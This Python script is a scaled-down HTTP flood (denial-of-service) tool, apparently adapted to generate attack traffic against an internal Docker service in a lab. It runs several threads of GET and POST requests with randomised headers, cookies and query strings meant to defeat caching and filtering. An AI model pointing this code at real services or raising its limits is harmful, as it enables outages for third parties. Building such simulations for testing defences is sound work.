"""
Network-secured version of ddos/HttpFlood.py
Modified to target consumer service on internal Docker network
Uses threading as in original but targets internal address only
"""

import threading
import requests
import random
import time

# SECURITY: Use internal Docker network address
target_url = "http://consumer:5000/"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101",
]

referers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
]

accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/xml,application/xhtml+xml,text/html;q=0.9",
]


def random_str(length=8):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choices(chars, k=length))


num_threads = 5  # Reduced from 20 for safety
num_requests = 50  # Reduced from 500 for safety

print(f"[HTTP Flood] Starting HTTP flood simulation")
print(f"[HTTP Flood] Target: {target_url}")
print(f"[HTTP Flood] Threads: {num_threads}, Requests: {num_requests} each")


def http_flood():
    for i in range(num_requests):
        method = random.choice(["GET", "POST"])
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": random.choice(accepts),
            "Referer": random.choice(referers),
            "Connection": "keep-alive",
            "Cookie": f"id={random_str(16)}",
        }
        rand_url = target_url + "?" + random_str(6) + "=" + random_str(10)

        try:
            if method == "GET":
                resp = requests.get(rand_url, headers=headers, timeout=5)
            else:
                payload = {random_str(5): random_str(8)}
                resp = requests.post(rand_url, data=payload, headers=headers, timeout=5)
            print(f"[HTTP Flood] {method} -> {resp.status_code}")
        except Exception as e:
            print(f"[HTTP Flood] Error: {type(e).__name__}")

        time.sleep(random.uniform(0.1, 0.5))  # Slow down from original


threads = []
for _ in range(num_threads):
    t = threading.Thread(target=http_flood, daemon=True)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("[HTTP Flood] Burst complete, sleeping before next...")
time.sleep(30)
